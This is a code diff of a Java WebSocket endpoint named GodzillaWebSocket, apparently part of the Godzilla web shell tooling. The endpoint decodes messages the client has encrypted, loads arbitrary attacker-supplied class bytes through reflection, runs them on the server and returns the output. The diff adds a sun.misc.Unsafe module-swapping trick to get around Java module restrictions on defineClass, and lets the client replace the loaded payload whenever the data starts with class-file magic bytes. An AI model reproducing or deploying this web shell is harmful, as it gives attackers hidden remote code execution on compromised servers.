@@ -6,6 +6,8 @@ import javax.websocket.Endpoint;
 import javax.websocket.EndpointConfig;
 import javax.websocket.MessageHandler;
 import javax.websocket.Session;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
@@ -16,15 +18,35 @@ import java.net.URLClassLoader;
  */
 public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<String> {
     public static String key;
-
     private Session session;
-    private Class<?> payload;
+    private static Class<?> payload;
 
-    public Class<?> Q(byte[] classBytes) throws Throwable {
+    public Class<?> reflectionDefineClass(byte[] classBytes) throws Throwable {
+        Object unsafe = null;
+        Object rawModule = null;
+        long offset = 48;
+        Method getAndSetObjectM = null;
+        try {
+            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            unsafe = unsafeField.get(null);
+            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
+            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
+            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
+            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
+            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
+        } catch (Throwable ignored) {
+        }
         URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
         Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
         defMethod.setAccessible(true);
-        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
+        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
+        if (getAndSetObjectM != null) {
+            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
+        }
+        return clazz;
     }
 
     public byte[] x(byte[] s, boolean m) {
@@ -48,11 +70,11 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
         try {
             byte[] data = base64Decode(message);
             data = x(data, false);
-            if (payload == null) {
-                payload = Q(data);
+            if (payload == null || (data[0] == -54 && data[1] == -2)) {
+                payload = reflectionDefineClass(data);
                 session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
             } else {
-                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
+                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                 Object obj = payload.newInstance();
                 obj.equals(data);
                 obj.equals(bos);
@@ -60,10 +82,7 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
                 session.getBasicRemote().sendText(base64Encode(x(bos.toByteArray(), true)));
             }
         } catch (Throwable e) {
-            try {
-                session.close();
-            } catch (java.io.IOException ignored) {
-            }
+            e.printStackTrace();
         }
     }
 
